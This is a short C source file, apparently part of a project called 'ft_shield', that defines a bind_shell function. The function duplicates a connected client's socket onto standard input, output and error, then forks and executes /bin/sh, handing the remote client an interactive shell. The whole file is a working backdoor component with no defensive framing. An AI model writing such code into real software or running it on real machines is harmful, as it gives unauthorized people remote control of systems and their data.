#include <ft_shield.h>

extern char **environ;

void bind_shell(int client_fd)
{
	pid_t	pid;
	char	*argv[] = {"/bin/sh", NULL};

	dup2(client_fd, 0);
	dup2(client_fd, 1);
	dup2(client_fd, 2);

	pid = fork();
	if (pid == 0)
		execve("/bin/sh", argv, environ);
}
